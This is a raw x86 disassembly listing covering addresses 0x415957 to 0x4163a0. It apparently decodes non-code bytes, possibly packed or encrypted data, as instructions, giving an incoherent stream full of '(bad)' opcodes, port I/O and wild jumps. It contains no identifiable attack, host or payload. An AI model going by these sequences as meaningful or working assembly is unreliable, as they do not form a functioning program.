  415957:	xor    dh,0x1d
  41595a:	rcr    DWORD PTR [esi-0x25851ca],1
  415960:	leave  
  415961:	inc    esp
  415962:	cmp    DWORD PTR [eax+edi*2-0x5b72ce9],ebp
  415969:	cmp    esp,DWORD PTR [eax]
  41596b:	sti    
  41596c:	or     al,0x91
  41596e:	retf   0xff22
  415971:	dec    ebp
  415972:	ds and ah,ah
  415975:	and    al,0xac
  415977:	shr    DWORD PTR [eax-0x12],cl
  41597a:	jmp    0x41592d
  41597c:	xchg   esp,eax
  41597d:	push   es
  41597e:	out    dx,eax
  41597f:	outs   dx,BYTE PTR ds:[esi]
  415980:	mov    al,ds:0x3273b021
  415985:	jecxz  0x4159cd
  415987:	xchg   ebp,eax
  415988:	jo     0x41592b
  41598a:	mov    edi,0xfa538a6d
  41598f:	inc    ebx
	...
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	sbb    edi,esp
  415a02:	cdq    
  415a03:	adc    esp,DWORD PTR [esp+eiz*8]
  415a06:	add    BYTE PTR [eax],al
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	scas   eax,DWORD PTR es:[edi]
  415a0d:	xor    al,0xc1
  415a0f:	mov    eax,ss:0x3b54fb03
  415a15:	cld    
  415a16:	cmp    dh,BYTE PTR [eax]
  415a18:	fdivr  QWORD PTR [edi-0x38]
  415a1b:	enter  0xf004,0x3b
  415a1f:	(bad)  
  415a20:	push   eax
  415a21:	pop    ebp
  415a22:	lahf   
  415a23:	push   ax
  415a25:	and    dh,al
  415a27:	das    
  415a28:	mov    edx,0x743a32ab
  415a2d:	sbb    BYTE PTR cs:[edi+0x3b8a1449],0x48
  415a35:	pop    ecx
  415a36:	mov    gs,WORD PTR [edx-0x447b9aef]
  415a3c:	and    DWORD PTR [ebx],eax
  415a3e:	das    
  415a3f:	dec    eax
  415a40:	jb     0x4159cb
  415a42:	jp     0x415a00
  415a44:	xchg   ebp,eax
  415a45:	iret   
  415a46:	xor    eax,0xeee72dea
  415a4b:	adc    bl,bl
  415a4d:	dec    eax
  415a4e:	pop    esp
  415a4f:	inc    edi
  415a50:	adc    DWORD PTR [ebx+0x4f],esi
  415a53:	jno    0x415a54
  415a55:	sub    DWORD PTR [edi+0x51],edi
  415a58:	enter  0xab22,0xf1
  415a5c:	inc    BYTE PTR [edx+0x13b650a3]
  415a62:	mov    eax,0xc2829991
  415a67:	stos   DWORD PTR es:[edi],eax
  415a68:	fsub   QWORD PTR [edx-0x21ac1c1a]
  415a6e:	dec    edi
  415a6f:	push   ds
  415a70:	fisub  WORD PTR [ecx-0x2e]
  415a73:	push   ss
  415a74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a75:	jecxz  0x415a3a
  415a77:	lahf   
  415a78:	cmp    al,0xa4
  415a7a:	xchg   esi,eax
  415a7b:	repz ficomp DWORD PTR [edx+0x5fe17dbb]
  415a82:	mov    al,ds:0x96b0da2e
  415a87:	cs add eax,0xabf21d11
  415a8d:	dec    eax
  415a8e:	ds jecxz 0x415a7e
  415a91:	cli    
  415a92:	mov    DWORD PTR [edx-0x716744b],ebx
  415a98:	sbb    edi,DWORD PTR [edx*8+0x62ee5c47]
  415a9f:	pushf  
  415aa0:	jl     0x415a5d
  415aa2:	mov    ds:0x17169957,eax
  415aa7:	or     eax,0x978c4608
  415aac:	adc    al,BYTE PTR [esi-0x40]
  415aaf:	cs dec ebp
  415ab1:	cmp    eax,0x1006d189
  415ab6:	mov    ebx,0x278abf76
  415abb:	shl    ebx,cl
  415abd:	pop    ss
  415abe:	pusha  
  415abf:	gs fdivrp st(1),st
  415ac2:	sbb    BYTE PTR [esi-0x7d6ba56f],0x31
  415ac9:	adc    BYTE PTR [edi+0x78],bl
  415acc:	test   BYTE PTR [edi+ecx*2],0x4c
  415ad0:	mov    ds:0x1ea0573b,al
  415ad5:	adc    dh,BYTE PTR [esi+ecx*4-0x6d82bae7]
  415adc:	loop   0x415ad6
  415ade:	pop    edx
  415adf:	push   cs
  415ae0:	pop    ebp
  415ae1:	enter  0x2c59,0xc7
  415ae5:	or     al,BYTE PTR [esi]
  415ae7:	mov    eax,ds:0x2c356a30
  415aec:	mov    esi,0x7b068010
  415af1:	or     al,0xc9
  415af3:	cmc    
  415af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415af5:	lahf   
  415af6:	imul   ebp,ebx,0x22398894
  415afc:	and    eax,0x2ae01504
  415b01:	adc    ch,BYTE PTR [edx]
  415b03:	cld    
  415b04:	sti    
  415b05:	jmp    0x415b43
  415b07:	push   cs
  415b08:	ja     0x415ab0
  415b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b0b:	mov    eax,ds:0x4d28d1f6
	...
  415b74:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fadd   QWORD PTR [esi+eax*2-0x1ad793b4]
  415b86:	add    BYTE PTR [eax],al
  415b88:	add    al,0x1
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	xor    esp,edx
  415b8e:	cmp    al,ah
  415b90:	ss push ebp
  415b92:	mov    ch,0x68
  415b94:	push   cx
  415b96:	ror    DWORD PTR [esi-0x49],0xa4
  415b9a:	fwait
  415b9b:	in     al,0x43
  415b9d:	lods   al,BYTE PTR ds:[esi]
  415b9e:	fisubr DWORD PTR [ebp-0xe]
  415ba1:	mov    ebp,0x10240809
  415ba6:	push   esp
  415ba7:	push   esp
  415ba8:	and    al,dl
  415baa:	mov    ebx,0xa912a6b5
  415baf:	and    DWORD PTR [edi-0x49],ebp
  415bb2:	adc    eax,0x473e01ad
  415bb7:	or     eax,0xebdcd022
  415bbc:	cli    
  415bbd:	dec    esp
  415bbe:	inc    ebp
  415bbf:	or     dl,bh
  415bc1:	adc    DWORD PTR [ebp+0x6d],eax
  415bc4:	add    eax,0xccdce67c
  415bc9:	enter  0x46c8,0x74
  415bcd:	out    0x27,eax
  415bcf:	mov    al,0x9c
  415bd1:	mov    al,ds:0x82f0159f
  415bd6:	loope  0x415b5e
  415bd8:	sub    BYTE PTR [ebp+0x5eb2cff9],0x10
  415bdf:	jb     0x415b79
  415be1:	fwait
  415be2:	lds    ebp,FWORD PTR [edx]
  415be4:	jno    0x415c4a
  415be6:	pop    ebp
  415be7:	cmp    DWORD PTR [ebx+0x2c],0x25
  415beb:	xchg   ebp,eax
  415bec:	and    ebp,DWORD PTR [esi+ecx*4]
  415bef:	inc    esi
  415bf0:	jge    0x415ba6
  415bf2:	out    dx,al
  415bf3:	jbe    0x415ba8
  415bf5:	je     0x415c0d
  415bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bf8:	inc    ecx
  415bf9:	pop    esp
  415bfa:	pop    ecx
  415bfb:	push   esp
  415bfc:	fadd   DWORD PTR [edx-0x57]
  415bff:	sar    BYTE PTR [ebx*8+0x7d685de7],1
  415c06:	in     eax,0x25
  415c08:	jecxz  0x415c38
  415c0a:	dec    ebp
  415c0b:	push   0x2f
  415c0d:	xor    eax,0x9856ba95
  415c12:	fucomip st,st(6)
  415c14:	adc    DWORD PTR [ebx+0x2098e983],0x65
  415c1b:	idiv   DWORD PTR [ecx]
  415c1d:	pop    ecx
  415c1e:	test   DWORD PTR [edx*2-0x43c27bdb],edx
  415c25:	add    bh,BYTE PTR [esp+eiz*2]
  415c28:	es jle 0x415c23
  415c2b:	xor    eax,0x82210943
  415c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c31:	jle    0x415c47
  415c33:	stos   DWORD PTR es:[edi],eax
  415c34:	jge    0x415c95
  415c36:	test   DWORD PTR [ebx+0x54986a08],esi
  415c3c:	das    
  415c3d:	fwait
  415c3e:	in     al,0x27
  415c40:	pop    esi
  415c41:	jo     0x415ca2
  415c43:	sti    
  415c44:	jecxz  0x415c7c
  415c46:	or     dl,dl
  415c48:	xchg   esi,eax
  415c49:	shr    DWORD PTR [eax],1
  415c4b:	cmc    
  415c4c:	and    al,0xba
  415c4e:	sub    al,0xb0
  415c50:	push   ss
  415c51:	sbb    eax,0x175af6b5
  415c56:	jne    0x415bee
  415c58:	(bad)  
  415c59:	int    0x67
  415c5b:	iret   
  415c5c:	pusha  
  415c5d:	ss add esi,eax
  415c60:	(bad)  
  415c61:	cs aaa 
  415c63:	xlat   BYTE PTR ds:[ebx]
  415c64:	adc    BYTE PTR [eax+0x0],dh
  415c67:	xor    esp,ebp
  415c69:	mov    edx,DWORD PTR [edx-0xe]
  415c6c:	inc    ecx
  415c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c6e:	stos   BYTE PTR es:[edi],al
  415c6f:	and    ebp,DWORD PTR [ecx]
  415c71:	mov    edi,0x7c217b2d
  415c76:	bound  eax,QWORD PTR cs:[edi]
  415c79:	rcr    DWORD PTR [esi+0x13829210],1
  415c7f:	add    eax,DWORD PTR [edi+eiz*4+0x32]
  415c83:	addr16 jbe 0x415c8b
  415c86:	inc    edi
  415c87:	fwait
  415c88:	retf   
  415c89:	stc    
  415c8a:	push   0x3d
  415c8c:	lgs    ebp,FWORD PTR [ebp-0x39]
	...
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xf2c8c51f
  415d03:	mov    ds:0xe62c,al
  415d08:	add    al,0x1
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	xor    BYTE PTR [edx+0x5a],dh
  415d0f:	xor    BYTE PTR [esp+edi*2],ch
  415d12:	and    ecx,DWORD PTR [ecx]
  415d14:	dec    eax
  415d15:	clc    
  415d16:	xchg   esi,eax
  415d17:	adc    ch,BYTE PTR [ecx+0x6d]
  415d1a:	loopne 0x415d7c
  415d1c:	xchg   DWORD PTR [esi+0x675e9b39],eax
  415d22:	setns  BYTE PTR [esi+0x58]
  415d26:	fnstenv [eax+0x77747975]
  415d2c:	sub    eax,0x5d255e1d
  415d31:	dec    ebx
  415d32:	xor    eax,0xfe5ccdad
  415d37:	cmp    ecx,esi
  415d39:	lea    esi,[esi]
  415d3b:	cli    
  415d3c:	(bad)  
  415d3d:	ja     0x415d22
  415d3f:	jmp    FWORD PTR [ebp-0x79]
  415d42:	arpl   WORD PTR [edi-0x13],di
  415d45:	adc    al,0x71
  415d47:	sbb    al,BYTE PTR [edi+edx*4]
  415d4a:	test   al,0xb3
  415d4c:	arpl   WORD PTR [ebx],bx
  415d4e:	ss pop ebp
  415d50:	mov    ds:0xb5428bcd,eax
  415d55:	add    esi,DWORD PTR [eax+0x2]
  415d58:	dec    ebp
  415d59:	jno    0x415dc6
  415d5b:	dec    eax
  415d5c:	mov    ebp,0x17429db2
  415d61:	add    eax,0x56ededf2
  415d66:	inc    esi
  415d67:	mov    esi,0x1ccd78cf
  415d6c:	fcom   DWORD PTR [ecx+0x31]
  415d6f:	push   edi
  415d70:	sahf   
  415d71:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  415d73:	pusha  
  415d74:	inc    DWORD PTR [edi+edi*2+0x18]
  415d78:	shr    bl,cl
  415d7a:	ror    edi,0x2e
  415d7d:	fild   DWORD PTR [edi+0x5a]
  415d80:	xor    eax,0x454fdc66
  415d85:	add    bl,bl
  415d87:	sbb    eax,0x3d7cfd95
  415d8c:	ror    BYTE PTR [esp+edx*8],1
  415d8f:	in     eax,0xe3
  415d91:	hlt    
  415d92:	fs hlt 
  415d94:	cli    
  415d95:	fsubr  DWORD PTR [ecx+ebp*8+0x5a]
  415d99:	jnp    0x415e0b
  415d9b:	mov    bl,0xd2
  415d9d:	je     0x415d86
  415d9f:	ret    
  415da0:	inc    ecx
  415da1:	aaa    
  415da2:	and    eax,0x777d36ee
  415da7:	test   al,0x5
  415da9:	ret    
  415daa:	mov    ds:0xf65e17f8,al
  415daf:	inc    esi
  415db0:	cdq    
  415db1:	inc    ebp
  415db2:	imul   esp,DWORD PTR [esi+0x16],0xa
  415db6:	mov    ds:0xe07089f8,eax
  415dbb:	outs   dx,BYTE PTR ds:[esi]
  415dbc:	pop    ss
  415dbd:	lds    edi,FWORD PTR [edi+eiz*4]
  415dc0:	jge    0x415da0
  415dc2:	jo     0x415de7
  415dc4:	lock and eax,0x91b69487
  415dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dcb:	stos   BYTE PTR es:[edi],al
  415dcc:	mov    ds:0xcd0b0bb1,al
  415dd1:	xor    edx,0x7c1e78a
  415dd7:	push   esi
  415dd8:	add    ebp,DWORD PTR [ecx-0x13]
  415ddb:	xor    eax,0x3f094e2b
  415de0:	push   esp
  415de1:	sar    DWORD PTR [esi-0x617a2b8f],0xcf
  415de8:	inc    ebp
  415de9:	jmp    0x415e57
  415deb:	call   0xc685b724
  415df0:	jb     0x415da1
  415df2:	mov    dh,0x89
  415df4:	xchg   esi,eax
  415df5:	test   BYTE PTR [esp+esi*2+0x65],ah
  415df9:	clc    
  415dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dfb:	das    
  415dfc:	jle    0x415e0e
  415dfe:	mov    ds,WORD PTR [ecx-0x13]
  415e01:	iret   
  415e02:	cmp    eax,0xb34dae42
  415e07:	xchg   ebp,eax
  415e08:	push   ds
  415e09:	push   ss
  415e0a:	add    eax,0xd290bda4
  415e0f:	xchg   DWORD PTR [eax],eax
	...
  415e71:	add    BYTE PTR [eax],al
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x70]
  415e81:	aad    0x96
  415e83:	mov    ebp,0xe730
  415e88:	add    al,0x1
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	add    BYTE PTR [edi],bl
  415e8e:	xor    eax,0xa2d5e71c
  415e93:	or     ebx,DWORD PTR [ebx-0x25f2e617]
  415e99:	ins    DWORD PTR es:[edi],dx
  415e9a:	or     BYTE PTR [esi+0x4fc198b0],cl
  415ea0:	gs jno 0x415eb1
  415ea3:	std    
  415ea4:	dec    BYTE PTR [esi+0x24]
  415ea7:	nop
  415ea8:	push   eax
  415ea9:	cld    
  415eaa:	popa   
  415eab:	(bad)  
  415ead:	pop    edi
  415eae:	cmp    BYTE PTR [edi-0x8],bl
  415eb1:	lds    esi,FWORD PTR [edx]
  415eb3:	add    edi,esp
  415eb5:	dec    edx
  415eb6:	mov    DWORD PTR [eax-0x1e],edi
  415eb9:	sub    ecx,edi
  415ebb:	push   ebx
  415ebc:	pop    ebp
  415ebd:	ins    DWORD PTR es:[edi],dx
  415ebe:	xchg   edi,eax
  415ebf:	xchg   ecx,eax
  415ec0:	cwde   
  415ec1:	ret    
  415ec2:	arpl   WORD PTR [eax+edx*4],di
  415ec5:	xchg   esi,eax
  415ec6:	arpl   WORD PTR [ecx-0x58],si
  415ec9:	jo     0x415f11
  415ecb:	test   BYTE PTR ds:0x3cdf83bf,ch
  415ed1:	popa   
  415ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ed3:	xchg   esp,eax
  415ed4:	jmp    0xd0cdf85f
  415ed9:	jae    0x415f48
  415edb:	jnp    0x415e97
  415edd:	call   0xa140:0x658b5607
  415ee4:	push   ss
  415ee5:	push   es
  415ee6:	arpl   WORD PTR [edx+0x18],cx
  415ee9:	leave  
  415eea:	pop    eax
  415eeb:	or     bh,ah
  415eed:	clc    
  415eee:	mov    WORD PTR [edi-0x741154dc],ds
  415ef4:	jecxz  0x415ea0
  415ef6:	cmp    eax,0xb7e02287
  415efb:	and    eax,DWORD PTR [ebp+eax*2+0x31]
  415eff:	push   cs
  415f00:	out    0x9e,al
  415f02:	pop    ecx
  415f03:	rcl    BYTE PTR [ebx+0x6ba23619],0x62
  415f0a:	sub    al,BYTE PTR [ebx]
  415f0c:	popa   
  415f0d:	cmp    esp,DWORD PTR [ecx+edi*8+0x27]
  415f11:	sbb    ecx,eax
  415f13:	ins    DWORD PTR es:[edi],dx
  415f14:	(bad)  
  415f15:	and    BYTE PTR [ebp+0x28],bh
  415f18:	cmp    eax,0x2b5f7689
  415f1d:	ja     0x415f50
  415f1f:	inc    esp
  415f20:	js     0x415ebf
  415f22:	adc    eax,ebp
  415f24:	fmul   QWORD PTR [esp+ebp*2-0x7b]
  415f28:	jle    0x415ee8
  415f2a:	addr16 hlt 
  415f2c:	adc    al,al
  415f2e:	mov    al,0x53
  415f30:	xlat   BYTE PTR ds:[ebx]
  415f31:	cmp    dl,BYTE PTR [edi-0xebfa941]
  415f37:	ja     0x415f57
  415f39:	mov    ecx,0x13a88349
  415f3e:	imul   edx,DWORD PTR [edi+ebx*8+0x3d651a15],0x797f5bc3
  415f49:	and    al,0xc
  415f4b:	sbb    eax,0xd3638201
  415f50:	sub    al,0x6
  415f52:	mov    ah,0x77
  415f54:	(bad)  
  415f55:	shr    DWORD PTR [esi],1
  415f57:	mov    ch,BYTE PTR [eax+0x3a]
  415f5a:	je     0x415eeb
  415f5c:	jno    0x415fb0
  415f5e:	adc    al,0x6c
  415f60:	outs   dx,DWORD PTR ds:[esi]
  415f61:	jb     0x415ee7
  415f63:	aad    0xfc
  415f65:	xchg   DWORD PTR [edx],ebx
  415f67:	or     edi,DWORD PTR [edi+0x5]
  415f6a:	rcr    DWORD PTR [bx+si+0x67a6],0xf5
  415f70:	std    
  415f71:	sbb    edx,DWORD PTR [edi-0x2d]
  415f74:	mov    ebx,0xbed0301c
  415f79:	cmc    
  415f7a:	ret    
  415f7b:	lods   eax,DWORD PTR ds:[esi]
  415f7c:	pop    esi
  415f7d:	and    ah,0xcf
  415f80:	xchg   edx,eax
  415f81:	inc    edi
  415f82:	ja     0x415f7e
  415f84:	xor    al,0xa4
  415f86:	push   esp
  415f87:	push   ebp
  415f88:	add    BYTE PTR [esi+0x63911a15],ah
  415f8e:	xchg   edx,eax
  415f8f:	inc    DWORD PTR [eax]
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	pop    edx
  416001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416002:	sbb    al,0x1b
  416004:	xor    al,0xe8
  416006:	add    BYTE PTR [eax],al
  416008:	add    al,0x1
  41600a:	add    BYTE PTR [eax],al
  41600c:	mov    WORD PTR [edx+eax*8-0x5f2b1564],?
  416013:	cmp    DWORD PTR [esi+edi*1-0x66],ebp
  416017:	stos   DWORD PTR es:[edi],eax
  416018:	rcr    bl,cl
  41601a:	pop    esp
  41601b:	out    0x69,al
  41601d:	add    DWORD PTR [esi-0x61],esp
  416020:	sbb    eax,0x71f47043
  416025:	mov    DWORD PTR [edi],ebx
  416027:	(bad)  
  416028:	jmp    0xabec0a94
  41602d:	mov    ss,WORD PTR [esi-0x12fabf9b]
  416033:	pop    ebx
  416034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416035:	(bad)  
  416036:	ret    0xc8e2
  416039:	call   0x22e46069
  41603e:	std    
  41603f:	aad    0x8
  416041:	sub    ecx,eax
  416043:	lock or BYTE PTR [edi+0x42],ch
  416047:	mov    esp,DWORD PTR [esi-0x1]
  41604a:	jmp    0x555f:0xd2bd1008
  416051:	test   BYTE PTR [esi-0x3f40ce52],ch
  416057:	fsub   st,st(1)
  416059:	(bad)  
  41605a:	popa   
  41605b:	cmp    eax,esp
  41605d:	cmp    al,0x69
  41605f:	(bad)
  416063:	popf   
  416064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416065:	and    DWORD PTR [eax],0x26
  416068:	xchg   ecx,eax
  416069:	mov    edi,0xab589195
  41606e:	cs mov dl,0x75
  416071:	push   esi
  416072:	in     al,0xba
  416074:	or     BYTE PTR [ebp-0x45ebb728],al
  41607a:	jl     0x41605b
  41607c:	rcr    BYTE PTR [eax-0x1ab82959],0xdf
  416083:	dec    DWORD PTR ds:0xb0ffaecf
  416089:	jns    0x4160d6
  41608b:	mov    ebx,0x29c42824
  416090:	add    DWORD PTR [ecx+0x3b],0x3547fc4c
  416097:	mov    al,ds:0x9be8b6f1
  41609c:	idiv   BYTE PTR [edi+0x6a]
  41609f:	arpl   WORD PTR [eax+0x6d],bp
  4160a2:	loope  0x4160ee
  4160a4:	lahf   
  4160a5:	dec    edi
  4160a6:	xchg   esi,eax
  4160a7:	mov    edi,0x87edb564
  4160ac:	jle    0x4160d2
  4160ae:	sbb    BYTE PTR [edx],cl
  4160b0:	lods   eax,DWORD PTR ds:[esi]
  4160b1:	push   ds
  4160b2:	sub    edi,ebx
  4160b4:	scas   eax,DWORD PTR es:[edi]
  4160b5:	rol    BYTE PTR [ecx],1
  4160b7:	xchg   ebx,eax
  4160b8:	mov    ebx,0x427fac5a
  4160bd:	mov    al,0x4
  4160bf:	xchg   ebx,eax
  4160c0:	or     eax,0x9311633f
  4160c5:	mov    bl,0x77
  4160c7:	add    DWORD PTR ds:0xbd5c7418,0xfffffffb
  4160ce:	lea    edi,[edx-0x68c81650]
  4160d4:	scas   al,BYTE PTR es:[edi]
  4160d5:	rol    DWORD PTR [esi-0x51],cl
  4160d8:	pop    ebx
  4160d9:	and    edx,DWORD PTR [ebp+ebx*4+0x77f2835d]
  4160e0:	jb     0x4160ea
  4160e2:	mov    BYTE PTR [ebx-0xa],dl
  4160e5:	add    esi,DWORD PTR [ebx]
  4160e7:	inc    esp
  4160e8:	sub    eax,0xd1dee111
  4160ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160ee:	pavgb  mm7,QWORD PTR [esi+0x74c247a3]
  4160f5:	xchg   edi,eax
  4160f6:	cmp    eax,0x97f2a850
  4160fb:	cli    
  4160fc:	jbe    0x4160da
  4160fe:	out    0xa8,al
  416100:	dec    esi
  416101:	outs   dx,DWORD PTR ds:[esi]
  416102:	mov    al,0x4d
  416104:	scas   al,BYTE PTR es:[edi]
  416105:	dec    edx
  416106:	jb     0x4160f0
  416108:	fnsave [edi+0x3c]
  41610b:	(bad)  [ecx]
  41610d:	sbb    eax,0x7b02
	...
  416172:	add    BYTE PTR [eax],al
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0x237671f3
  416183:	ret    0xe938
  416186:	add    BYTE PTR [eax],al
  416188:	add    al,0x1
  41618a:	add    BYTE PTR [eax],al
  41618c:	outs   dx,BYTE PTR ds:[esi]
  41618d:	hlt    
  41618e:	mov    cl,BYTE PTR [edx]
  416190:	or     esi,esi
  416192:	ins    BYTE PTR es:[edi],dx
  416193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416194:	clc    
  416195:	out    dx,eax
  416196:	test   al,0xe2
  416198:	fwait
  416199:	mov    dl,0xe4
  41619b:	add    al,0x8
  41619d:	fld    DWORD PTR [ecx+0x31]
  4161a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161a1:	inc    esi
  4161a2:	mov    bl,0x76
  4161a4:	cli    
  4161a5:	mov    ah,0xc4
  4161a7:	dec    esp
  4161a8:	loop   0x416191
  4161aa:	xor    dh,dh
  4161ac:	xlat   BYTE PTR ds:[ebx]
  4161ad:	inc    edi
  4161ae:	int    0x66
  4161b0:	lods   eax,DWORD PTR ds:[esi]
  4161b1:	add    eax,0xc2ffd59b
  4161b6:	mov    dh,0x91
  4161b8:	inc    ecx
  4161b9:	int3   
  4161ba:	xchg   edi,eax
  4161bb:	pop    edi
  4161bc:	out    dx,eax
  4161bd:	js     0x416228
  4161bf:	pop    esp
  4161c0:	es aad 0xbb
  4161c3:	out    0x15,eax
  4161c5:	fwait
  4161c6:	xor    bh,BYTE PTR [ebx]
  4161c8:	inc    ecx
  4161c9:	in     al,dx
  4161ca:	mov    ecx,0x86fc2ce5
  4161cf:	sbb    al,0x5d
  4161d1:	xor    DWORD PTR [ebx+0x4c],0xe3977fe5
  4161d8:	inc    eax
  4161d9:	push   cs
  4161da:	xchg   ecx,eax
  4161db:	pop    ds
  4161dc:	add    BYTE PTR [esi-0x55b5d1df],0x7d
  4161e3:	sub    eax,0xdebd0687
  4161e8:	mov    ebx,edx
  4161ea:	ins    DWORD PTR es:[edi],dx
  4161eb:	sbb    DWORD PTR [ebp-0x50],esp
  4161ee:	push   0x81b21deb
  4161f3:	ins    DWORD PTR es:[edi],dx
  4161f4:	mov    ebx,0xdd542581
  4161f9:	stos   BYTE PTR es:[edi],al
  4161fa:	xor    BYTE PTR [edi+ecx*2],bl
  4161fd:	mov    eax,DWORD PTR [eax-0x2f]
  416200:	mov    ds:0x75a6cdc9,al
  416205:	jmp    0x42f81ea0
  41620a:	stos   DWORD PTR es:[edi],eax
  41620b:	and    eax,0x629836bd
  416210:	in     eax,0xa5
  416212:	lds    esi,FWORD PTR [ebp+0x2e]
  416215:	in     eax,0x5c
  416217:	mov    dl,0xfb
  416219:	and    edx,DWORD PTR [esi]
  41621b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41621c:	repz cmp al,0x57
  41621f:	je     0x4161a9
  416221:	sub    eax,0x152cf822
  416226:	cli    
  416227:	enter  0x15dd,0xe7
  41622b:	cdq    
  41622c:	jle    0x4162a5
  41622e:	mov    ebx,0x7460ac76
  416233:	xchg   ecx,eax
  416234:	xchg   ecx,eax
  416235:	xor    esp,DWORD PTR ds:0xfcfb771a
  41623b:	jnp    0x41629e
  41623d:	shl    DWORD PTR [esi+0x1b],0x4c
  416241:	jge    0x416213
  416243:	aad    0xcc
  416245:	out    dx,eax
  416246:	or     ch,cl
  416248:	loop   0x4162a6
  41624a:	(bad)  
  41624c:	jbe    0x4162b5
  41624e:	add    bh,BYTE PTR [edx]
  416250:	popa   
  416251:	mov    ebx,0x1a609cff
  416256:	add    al,0x1
  416258:	adc    DWORD PTR [edi-0x4db4020b],esi
  41625e:	xor    dl,BYTE PTR [ebp+0x74]
  416261:	add    DWORD PTR [eax-0x22],esi
  416264:	cs cmp eax,0x25bd1dde
  41626a:	sbb    bl,BYTE PTR [eax]
  41626c:	pop    ecx
  41626d:	and    eax,0x9229b79b
  416272:	or     bh,0xaa
  416275:	jmp    0xc550:0xc58cff65
  41627c:	inc    ebp
  41627d:	mov    ah,0xdf
  41627f:	shr    dh,cl
  416281:	and    ch,BYTE PTR [edi-0x2a]
  416284:	cdq    
  416285:	ret    
  416286:	sbb    eax,0xb20a97ef
  41628b:	sbb    al,BYTE PTR ds:0xe513f3
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3cb9:0x2af9d2ee
  416305:	jmp    0x0:0x1040000
  41630c:	push   edi
  41630d:	or     al,0xfc
  41630f:	adc    ecx,ebp
  416311:	cwde   
  416312:	adc    DWORD PTR [esi-0x198fd371],ebx
  416318:	jne    0x41631d
  41631a:	cs lahf 
  41631c:	mov    ds:0xbbadd200,al
  416321:	cdq    
  416322:	iret   
  416323:	dec    esi
  416324:	xlat   BYTE PTR ds:[ebx]
  416325:	lds    edi,FWORD PTR [edx-0x12]
  416328:	sub    al,0x3d
  41632a:	rcl    DWORD PTR [ecx+eax*1+0x78],1
  41632e:	xchg   ebx,eax
  41632f:	leave  
  416330:	cmp    DWORD PTR [ebp-0x4a738b07],eax
  416336:	and    ebx,DWORD PTR [ebx-0x6adfde17]
  41633c:	pusha  
  41633d:	inc    ebp
  41633e:	stos   BYTE PTR es:[edi],al
  41633f:	sbb    eax,0xdf209627
  416344:	push   edx
  416345:	jge    0x41631a
  416347:	data16 jne 0x41639f
  41634a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41634b:	sbb    BYTE PTR [ebx+0x1e],ah
  41634e:	hlt    
  41634f:	aas    
  416350:	arpl   WORD PTR [esi-0x4],ax
  416353:	push   es
  416354:	or     edx,ebx
  416356:	add    eax,0xfa1e7ae5
  41635b:	xlat   BYTE PTR ds:[ebx]
  41635c:	adc    esp,DWORD PTR [ebp+edx*8-0x2ba7d611]
  416363:	test   eax,0x7da38ecf
  416368:	xchg   DWORD PTR [ebx],edi
  41636a:	and    eax,0x84943e2d
  41636f:	sub    al,0xe3
  416371:	loop   0x41634f
  416373:	out    dx,al
  416374:	add    ch,ch
  416376:	in     eax,dx
  416377:	add    eax,0xaf0cdc57
  41637c:	mov    al,0xfa
  41637e:	pop    esp
  41637f:	mov    esi,DWORD PTR [esi-0x42]
  416382:	mov    edi,0xc4aa4825
  416387:	jge    0x4163de
  416389:	lahf   
  41638a:	xchg   esi,eax
  41638b:	paddb  mm3,QWORD PTR [eax]
  41638e:	(bad)  
  41638f:	scas   al,BYTE PTR es:[edi]
  416390:	in     al,dx
  416391:	xor    ch,BYTE PTR [esp-0x4fd935b7]
  416398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416399:	je     0x416321
  41639b:	sbb    al,al
  41639d:	je     0x41637f
  41639f:	das    
  4163a0:	fstp   DWORD PTR [esp+edx*1]
